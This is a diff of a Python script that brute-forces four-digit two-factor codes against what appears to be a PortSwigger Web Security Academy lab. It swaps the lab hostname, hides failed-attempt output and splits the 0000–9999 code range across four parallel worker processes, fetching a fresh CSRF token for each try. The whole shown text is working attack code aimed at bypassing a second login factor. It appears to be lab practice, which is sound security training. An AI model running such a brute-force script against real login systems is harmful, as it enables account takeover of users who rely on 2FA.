@@ -1,5 +1,5 @@
 import requests
-import sys
+import sys  # instructions say to import this lib; but it isn't being used
 from bs4 import BeautifulSoup
 import multiprocessing
 
@@ -9,7 +9,7 @@ if 'https://' in site:
     site = site.rstrip('/').lstrip('https://')
 """
 # For me only
-site = 'ac891f1c1e43a112800d19a60017007f.web-security-academy.net'
+site = 'ace11ff21f0a2524800b768400250032.web-security-academy.net'
 s = requests.Session()
 
 
@@ -31,7 +31,8 @@ def try_code(csrf, code):
         print(f'2fa valid with response code {resp.status_code} using {login2data["mfa-code"]}')
         # Visit account profile page to complete level
     else:
-        print(f'2fa invalid with response code: {resp.status_code} using {login2data["mfa-code"]}')
+        print(".", end='')
+        # print(f'2fa invalid with response code: {resp.status_code} using {login2data["mfa-code"]}')
     return resp.status_code
 
 
@@ -54,7 +55,9 @@ def get_csrf():
     return soup.find('input', {'name': 'csrf'}).get('value')
 
 
-def dispatch_requests(low, high):
+def dispatch_requests(range_arg):
+    low = range_arg[0]
+    high = range_arg[1]
     iterations = ceildiv(high - low + 1, 2)
     for x in range(iterations):
         csrf = get_csrf()
@@ -70,4 +73,8 @@ def dispatch_requests(low, high):
                     break
 
 
-dispatch_requests(0, 9999)
+if __name__ == '__main__':
+    processing = [[0, 2500], [2501, 5000], [5001, 7500], [7501, 9999]]
+    p = multiprocessing.Pool(4)
+    p.map(dispatch_requests, processing)
+    p.close()
